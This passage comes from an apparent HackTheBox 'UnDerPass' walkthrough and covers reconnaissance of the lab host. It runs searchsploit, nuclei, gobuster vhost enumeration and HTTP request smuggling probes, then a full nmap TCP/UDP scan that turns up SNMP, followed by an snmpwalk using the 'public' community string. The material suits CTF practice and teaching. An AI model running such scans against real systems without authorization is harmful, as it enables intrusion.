RedHat Apache 2.0.40 - Directory Index Default Configuration Error                                                                  | linux/remote/23296.txt
RedHat Linux 7.0 Apache - Remote Username Enumeration                                                                               | linux/remote/21112.php
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execution                                                    | linux/remote/34.pl
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
We are running version *2.4.52*, so *apache2* may be better:
```Bash
─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
└──╼ [★]$ searchsploit apache2
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation                                               | linux/local/46676.php
Apache mod_perl - 'Apache::Status' / 'Apache2::Status' Cross-Site Scripting                                                         | multiple/remote/9993.txt
Apache2Triad 1.5.4 - Multiple Vulnerabilities                                                                                       | php/webapps/42520.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
The *graceful* exploit is not a good fit as we do not match that range.\
Going to search using **nuclei** instead.\
First install and update:
```Bash
sudo apt install nuclei -y
nuclei ut # update templates
```
Now to run it on our target
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
└──╼ [★]$ nuclei -u http://underpass.htb

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v2.9.14

		projectdiscovery.io

[WRN] Found 1113 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v2.9.14 (outdated)
[INF] Current nuclei-templates version: v10.1.1 (latest)
[INF] New templates added in latest release: 154
[INF] Templates loaded for current scan: 8428
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1715 (Reduced 1606 Requests)
[INF] Using Interactsh Server: oast.me
[apache-detect] [http] [info] http://underpass.htb [Apache/2.4.52 (Ubuntu)]
[default-apache-test-all] [http] [info] http://underpass.htb [Apache/2.4.52 (Ubuntu)]
[default-apache2-ubuntu-page] [http] [info] http://underpass.htb
[options-method] [http] [info] http://underpass.htb [GET,POST,OPTIONS,HEAD]
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://underpass.htb
[http-missing-security-headers:clear-site-data] [http] [info] http://underpass.htb
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://underpass.htb
[http-missing-security-headers:strict-transport-security] [http] [info] http://underpass.htb
[http-missing-security-headers:content-security-policy] [http] [info] http://underpass.htb
[http-missing-security-headers:permissions-policy] [http] [info] http://underpass.htb
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://underpass.htb
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://underpass.htb
[http-missing-security-headers:x-frame-options] [http] [info] http://underpass.htb
[http-missing-security-headers:x-content-type-options] [http] [info] http://underpass.htb
[http-missing-security-headers:referrer-policy] [http] [info] http://underpass.htb
[caa-fingerprint] [dns] [info] underpass.htb
[waf-detect:apachegeneric] [http] [info] http://underpass.htb/
[INF] Skipped underpass.htb:80 from target list as found unresponsive 30 times
```
> This [CVE page](https://www.cvedetails.com/vendor/45/) may also be useful.

---
### Prodding
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
└──╼ [★]$ curl -I http://underpass.htb/
HTTP/1.1 200 OK
Date: Fri, 03 Jan 2025 00:35:36 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Thu, 29 Aug 2024 01:28:15 GMT
ETag: "29af-620c8638b9276"
Accept-Ranges: bytes
Content-Length: 10671
Vary: Accept-Encoding
Content-Type: text/html
```
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
└──╼ [★]$ curl -X OPTIONS http://underpass.htb/
```

---
### Enumeration
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~]
└──╼ [★]$ gobuster vhost -u http://underpass.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://underpass.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: 1 Status: 400 [Size: 301]
Found: 11192521404255 Status: 400 [Size: 301]
Found: 11192521403954 Status: 400 [Size: 301]
Found: gc._msdcs Status: 400 [Size: 301]
Found: 2 Status: 400 [Size: 301]
Found: 11285521401250 Status: 400 [Size: 301]
Found: 2012 Status: 400 [Size: 301]
Found: 11290521402560 Status: 400 [Size: 301]
Found: 123 Status: 400 [Size: 301]
Found: 2011 Status: 400 [Size: 301]
Found: 3 Status: 400 [Size: 301]
Found: 4 Status: 400 [Size: 301]
Found: 2013 Status: 400 [Size: 301]
Found: 2010 Status: 400 [Size: 301]
Found: 911 Status: 400 [Size: 301]
Found: 11 Status: 400 [Size: 301]
Found: 24 Status: 400 [Size: 301]
Found: 10 Status: 400 [Size: 301]
Found: 7 Status: 400 [Size: 301]
Found: 99 Status: 400 [Size: 301]
Found: 2009 Status: 400 [Size: 301]
Found: www.1 Status: 400 [Size: 301]
Found: 50 Status: 400 [Size: 301]
Found: 12 Status: 400 [Size: 301]
Found: 20 Status: 400 [Size: 301]
Found: 2008 Status: 400 [Size: 301]
Found: 25 Status: 400 [Size: 301]
Found: 15 Status: 400 [Size: 301]
Found: 5 Status: 400 [Size: 301]
Found: www.2 Status: 400 [Size: 301]
Found: 13 Status: 400 [Size: 301]
Found: 100 Status: 400 [Size: 301]
Found: 44 Status: 400 [Size: 301]
Found: 54 Status: 400 [Size: 301]
Found: 9 Status: 400 [Size: 301]
Found: 70 Status: 400 [Size: 301]
Found: 01 Status: 400 [Size: 301]
Found: 16 Status: 400 [Size: 301]
Found: 39 Status: 400 [Size: 301]
Found: 6 Status: 400 [Size: 301]
Found: www.123 Status: 400 [Size: 301]
Found: 88 Status: 400 [Size: 301]
Found: 21 Status: 400 [Size: 301]
Found: 17 Status: 400 [Size: 301]
Found: 14 Status: 400 [Size: 301]
Found: 18 Status: 400 [Size: 301]
Found: 37 Status: 400 [Size: 301]
Found: 1234 Status: 400 [Size: 301]
Found: 79 Status: 400 [Size: 301]
Found: 35 Status: 400 [Size: 301]
Found: 49 Status: 400 [Size: 301]
Found: 114 Status: 400 [Size: 301]
Found: 29 Status: 400 [Size: 301]
Found: 0 Status: 400 [Size: 301]
Found: 8 Status: 400 [Size: 301]
Found: 19 Status: 400 [Size: 301]
Found: 1000 Status: 400 [Size: 301]
Found: 48 Status: 400 [Size: 301]
Found: 34 Status: 400 [Size: 301]
Found: 46 Status: 400 [Size: 301]
Found: 51 Status: 400 [Size: 301]
Found: 27 Status: 400 [Size: 301]
Found: 60 Status: 400 [Size: 301]
Found: 26 Status: 400 [Size: 301]
Found: 22 Status: 400 [Size: 301]
Found: 90 Status: 400 [Size: 301]
Found: 80 Status: 400 [Size: 301]
Found: 23 Status: 400 [Size: 301]
Found: 31 Status: 400 [Size: 301]
Found: 66 Status: 400 [Size: 301]
Found: 67 Status: 400 [Size: 301]
Found: 40 Status: 400 [Size: 301]
Found: 53 Status: 400 [Size: 301]
Found: 52 Status: 400 [Size: 301]
Found: mail.99 Status: 400 [Size: 301]
Found: www.2012 Status: 400 [Size: 301]
Found: 112 Status: 400 [Size: 301]
Found: 42 Status: 400 [Size: 301]
Found: 45 Status: 400 [Size: 301]
Found: 47 Status: 400 [Size: 301]
Found: 61 Status: 400 [Size: 301]
Found: 69 Status: 400 [Size: 301]
Found: 77 Status: 400 [Size: 301]
Found: 32 Status: 400 [Size: 301]
Found: 360 Status: 400 [Size: 301]
Found: 57 Status: 400 [Size: 301]
Found: 63 Status: 400 [Size: 301]
Found: 30 Status: 400 [Size: 301]
Found: 76 Status: 400 [Size: 301]
Found: www.24 Status: 400 [Size: 301]
Found: 94 Status: 400 [Size: 301]
Found: 64 Status: 400 [Size: 301]
Found: 111 Status: 400 [Size: 301]
Found: 28 Status: 400 [Size: 301]
Found: 33 Status: 400 [Size: 301]
Found: 41 Status: 400 [Size: 301]
Found: 101 Status: 400 [Size: 301]
Found: 163 Status: 400 [Size: 301]
Found: 203 Status: 400 [Size: 301]
Found: 666 Status: 400 [Size: 301]
Found: 365 Status: 400 [Size: 301]
Found: www.2011 Status: 400 [Size: 301]
Found: www.11 Status: 400 [Size: 301]
Found: 777 Status: 400 [Size: 301]
Found: 12345 Status: 400 [Size: 301]
Found: 132 Status: 400 [Size: 301]
Found: mail.85st Status: 400 [Size: 301]
Found: 43 Status: 400 [Size: 301]
Found: 120 Status: 400 [Size: 301]
Found: 65 Status: 400 [Size: 301]
Found: www.4 Status: 400 [Size: 301]
Found: www.3 Status: 400 [Size: 301]
Found: 87 Status: 400 [Size: 301]
Found: 89 Status: 400 [Size: 301]
Found: 91 Status: 400 [Size: 301]
Found: 71 Status: 400 [Size: 301]
Found: 58 Status: 400 [Size: 301]
Found: 56 Status: 400 [Size: 301]
Found: 55 Status: 400 [Size: 301]
Found: www.16 Status: 400 [Size: 301]
Found: 204 Status: 400 [Size: 301]
Found: 103 Status: 400 [Size: 301]
Found: www.10 Status: 400 [Size: 301]
Found: www.2013 Status: 400 [Size: 301]
Found: 110 Status: 400 [Size: 301]
Found: 404 Status: 400 [Size: 301]
Found: www.15 Status: 400 [Size: 301]
Found: 125 Status: 400 [Size: 301]
Found: 123456 Status: 400 [Size: 301]
Found: 86 Status: 400 [Size: 301]
Found: 81 Status: 400 [Size: 301]
Found: 75 Status: 400 [Size: 301]
Found: 74 Status: 400 [Size: 301]
Found: 68 Status: 400 [Size: 301]
Found: 62 Status: 400 [Size: 301]
Found: 96 Status: 400 [Size: 301]
Found: www.12 Status: 400 [Size: 301]
Found: www.13 Status: 400 [Size: 301]
Found: www.20 Status: 400 [Size: 301]
Found: www.9 Status: 400 [Size: 301]
Found: 02 Status: 400 [Size: 301]
Found: 222 Status: 400 [Size: 301]
Found: 8591 Status: 400 [Size: 301]
Found: mail.8591 Status: 400 [Size: 301]
Found: mail.77p2p Status: 400 [Size: 301]
Found: 5278 Status: 400 [Size: 301]
Found: mail.5278 Status: 400 [Size: 301]
Found: 228 Status: 400 [Size: 301]
Found: mail.85cc Status: 400 [Size: 301]
Found: www.7 Status: 400 [Size: 301]
Found: 109 Status: 400 [Size: 301]
Found: 129 Status: 400 [Size: 301]
Found: 128 Status: 400 [Size: 301]
Found: 105 Status: 400 [Size: 301]
Found: 118 Status: 400 [Size: 301]
Found: 119 Status: 400 [Size: 301]
Found: 212 Status: 400 [Size: 301]
Found: 121 Status: 400 [Size: 301]
Found: 126 Status: 400 [Size: 301]
Found: 000 Status: 400 [Size: 301]
Found: 106 Status: 400 [Size: 301]
Found: 11091521400593 Status: 400 [Size: 301]
Found: 230 Status: 400 [Size: 301]
Found: 234 Status: 400 [Size: 301]
Found: 080 Status: 400 [Size: 301]
Found: 233 Status: 400 [Size: 301]
Found: 170 Status: 400 [Size: 301]
Found: www.19 Status: 400 [Size: 301]
Found: www.25 Status: 400 [Size: 301]
Found: 93 Status: 400 [Size: 301]
Found: www.17 Status: 400 [Size: 301]
Found: www.18 Status: 400 [Size: 301]
Found: 97 Status: 400 [Size: 301]
Found: 59 Status: 400 [Size: 301]
Found: 95 Status: 400 [Size: 301]
Found: 72 Status: 400 [Size: 301]
Found: 36 Status: 400 [Size: 301]
Found: 73 Status: 400 [Size: 301]
Found: 92 Status: 400 [Size: 301]
Found: 03 Status: 400 [Size: 301]
Found: 38 Status: 400 [Size: 301]
Found: 205 Status: 400 [Size: 301]
Found: 1111 Status: 400 [Size: 301]
Found: mail.666av Status: 400 [Size: 301]
Found: mail.080 Status: 400 [Size: 301]
Found: 235 Status: 400 [Size: 301]
Found: www.2010 Status: 400 [Size: 301]
Found: 211 Status: 400 [Size: 301]
Found: 192 Status: 400 [Size: 301]
Found: 2006 Status: 400 [Size: 301]
Found: 209 Status: 400 [Size: 301]
Found: 117 Status: 400 [Size: 301]
Found: 130 Status: 400 [Size: 301]
Found: 007 Status: 400 [Size: 301]
Found: 137 Status: 400 [Size: 301]
Found: www.6 Status: 400 [Size: 301]
Found: www.5 Status: 400 [Size: 301]
Found: www.14 Status: 400 [Size: 301]
Found: 169 Status: 400 [Size: 301]
Found: 237 Status: 400 [Size: 301]
Found: 131 Status: 400 [Size: 301]
Found: 134 Status: 400 [Size: 301]
Found: 162 Status: 400 [Size: 301]
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```
All of them are 400 and tells us that there are likely no subdomains.

```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-lvhikyluud]─[~/smuggler]
└──╼ [★]$ python3 smuggler.py -u http://underpass.htb

  ______                         _              
 / _____)                       | |             
( (____  ____  _   _  ____  ____| | _____  ____ 
 \____ \|    \| | | |/ _  |/ _  | || ___ |/ ___)
 _____) ) | | | |_| ( (_| ( (_| | || ____| |    
(______/|_|_|_|____/ \___ |\___ |\_)_____)_|    
                    (_____(_____|               

     @defparam                         v1.1

[+] URL        : http://underpass.htb
[+] Method     : POST
[+] Endpoint   : 
[+] Configfile : default.py
[+] Timeout    : 5.0 seconds
[+] Cookies    : 0 (Appending to the attack)
[nameprefix1]  : OK (TECL: 0.14 - 400) (CLTE: 0.14 - 400)                                           
[tabprefix1]   : OK (TECL: 0.14 - 200) (CLTE: 0.14 - 200)                                           
[tabprefix2]   : OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[space1]       : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-01]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-01] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-01]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-01]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-01] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacex-01] : OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-01]: OK (TECL: 0.14 - 400) (CLTE: 0.14 - 400)                                           
[xnprespace-01]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-01]: OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-01]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-04]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-04] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-04]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-04]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-04] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacex-04] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-04]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-04]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-04]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-04]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-08]  : OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[postspace-08] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-08]  : OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[endspace-08]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-08] : OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[endspacex-08] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-08]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-08]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-08]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-08]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-09]  : OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[postspace-09] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-09]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-09]  : OK (TECL: 0.13 - 200) (CLTE: 0.14 - 200)                                           
[xprespace-09] : OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[endspacex-09] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-09]: OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[xnprespace-09]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-09]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-09]: OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[midspace-0a]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-0a] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-0a]  : OK (TECL: 0.13 - 400) (CLTE: 0.26 - 400)                                           
[endspace-0a]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-0a] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacex-0a] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-0a]: OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[xnprespace-0a]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-0a]: OK (TECL: 0.14 - 200) (CLTE: 0.13 - 200)                                           
[endspacexn-0a]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-0b]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-0b] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-0b]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-0b]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-0b] : OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[endspacex-0b] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-0b]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-0b]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-0b]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-0b]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-0c]  : OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[postspace-0c] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-0c]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-0c]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-0c] : OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[endspacex-0c] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-0c]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-0c]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-0c]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-0c]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-0d]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-0d] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-0d]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-0d]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-0d] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacex-0d] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-0d]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-0d]: OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[endspacerx-0d]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-0d]: OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[midspace-1f]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-1f] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-1f]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-1f]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-1f] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacex-1f] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-1f]: OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-1f]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-1f]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-1f]: OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[midspace-20]  : OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[postspace-20] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-20]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-20]  : OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[xprespace-20] : OK (TECL: 0.13 - 200) (CLTE: 0.14 - 200)                                           
[endspacex-20] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-20]: OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-20]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-20]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-20]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-7f]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-7f] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-7f]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-7f]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-7f] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacex-7f] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-7f]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-7f]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-7f]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-7f]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-a0]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[postspace-a0] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[prespace-a0]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspace-a0]  : OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-a0] : OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[endspacex-a0] : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-a0]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xnprespace-a0]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-a0]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-a0]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[midspace-ff]  : OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[postspace-ff] : OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[prespace-ff]  : OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[endspace-ff]  : OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[xprespace-ff] : OK (TECL: 0.13 - 200) (CLTE: 0.13 - 200)                                           
[endspacex-ff] : OK (TECL: 0.14 - 400) (CLTE: 0.13 - 400)                                           
[rxprespace-ff]: OK (TECL: 0.13 - 400) (CLTE: 0.14 - 400)                                           
[xnprespace-ff]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacerx-ff]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)                                           
[endspacexn-ff]: OK (TECL: 0.13 - 400) (CLTE: 0.13 - 400)
```
> Some of these output with *200*, meaning we may be able to exploit using HRS or HTTP Request Smuggling

---
## Re-Recon
I gave up trying to get a smuggle working and so I looked into thise [guide](https://thecybersecguru.com/ctf-walkthroughs/mastering-underpass-beginners-guide-from-hackthebox/).\
They tell me that their are open UDP ports to look into, so I tried:
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-efkagecyrh]─[~]
└──╼ [★]$ nmap -T5 --open -sS -sU -p- --min-rate=1500 underpass.htb -oN nmap-scan.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-04 19:38 CST
Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.067s latency).
Not shown: 65424 closed tcp ports (reset), 137 closed udp ports (port-unreach), 65397 open|filtered udp ports (no-response), 109 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 149.83 seconds
```
> There we go! Something I missed the first time!
>> **161/udp open  snmp**

### SNMP Walk
Time to get started on looking into it:
```Bash
┌─[us-vip-3]─[10.10.14.3]─[gntsqid@htb-efkagecyrh]─[~]
└──╼ [★]$ snmpwalk -v 2c -c public underpass.htb
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (7868276) 21:51:22.76
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
